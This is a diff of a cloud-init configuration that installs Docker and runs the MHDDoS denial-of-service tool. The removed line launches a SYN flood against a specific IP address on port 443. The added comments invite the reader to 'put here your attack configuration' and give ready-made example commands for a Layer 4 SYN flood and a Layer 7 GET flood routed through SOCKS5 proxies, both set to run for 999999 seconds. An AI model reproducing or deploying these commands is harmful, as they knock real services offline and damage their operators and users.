@@ -13,4 +13,9 @@ apt:
       source: "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
       keyid: 8D81803C0EBFCD88
 runcmd:
-  - "docker run --name mhddos --rm -d djebos/mhddos:latest syn 185.114.138.220:443 100 999999"
+# Put here your attack configuration. Refer to examples below:
+# Layer 4 Attack: method SYN flood, ip 1.1.1.1, port 443, threads 100, duration 999999 seconds
+#  - "docker run --name mhddos --rm -d djebos/mhddos:latest syn 1.1.1.1:443 100 999999"
+# Layer 7 Attack: method - GET flood, link - https://example.in.com, socks5 proxy enabled - 5, threads - 1000, file with proxy IPs - proxy.txt, request per connection 100, duration 999999 seconds
+#  - "docker run --name mhddos --rm -d djebos/mhddos:latest get https://example.in.com 5 1000 proxy.txt 100 999999"
+
